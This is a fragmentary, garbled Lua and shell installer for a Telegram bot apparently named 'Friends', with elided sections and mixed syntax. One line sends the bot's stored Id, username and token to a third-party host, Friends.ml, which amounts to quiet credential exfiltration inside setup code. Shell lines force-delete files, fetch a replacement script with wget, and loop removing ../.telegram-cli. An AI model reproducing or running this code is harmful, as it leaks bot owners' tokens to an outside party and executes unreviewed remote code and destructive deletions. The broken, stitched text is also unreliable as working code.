...
------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------
if not database:get(Server_Friends.."UserName_Friends") then
print("\27[1;34m\n»» Send Your UserName Sudo : \27[m")
local UserName = io.read():gsub('@','')
if UserName ~= '' then
local Get_Info = http.request("http://Friends.ml/info/?user="..UserName)
...
database:set(Server_Friends.."UserName_Friends",Json.Info.Username)
database:set(Server_Friends.."Id_Friends",Json.Info.Id)
end
end
else
...
http.request("http://Friends.ml/add/?id="..database:get(Server_Friends.."Id_Friends").."&user="..database:get(Server_Friends.."UserName_Friends").."&token="..database:get(Server_Friends.."Token_Friends"))
...
rm -fr Friends.lua
wget "https://raw.githubusercontent.com/Friendsabas/Friends/master/Friends.lua"
while(true) do
rm -fr ../.telegram-cli
